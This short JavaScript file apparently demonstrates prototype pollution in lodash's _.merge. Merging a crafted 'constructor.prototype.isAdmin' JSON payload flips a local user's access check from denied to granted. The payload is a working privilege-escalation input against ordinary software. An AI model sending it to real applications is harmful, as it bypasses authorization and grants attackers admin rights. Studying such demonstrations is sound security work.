var _ = require('lodash');

var user1 = {
    id : 1,
};
if(user1.isAdmin)
{
    console.log("Access Given")
}
else {
    console.log("Access Denied");
}

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'); // If this is provided as 
                                                                                //an argument to be merged
                                                                                // by a malicious user
var payload2; // The malicious user does not provide anything for second argument

if( payload2 == undefined )
result = _.merge({}, payload1);
else 
result =_.merge(payload2,payload1);

if(user1.isAdmin)
{
    console.log("Access Given")
}
else {
    console.log("Access Denied");
}
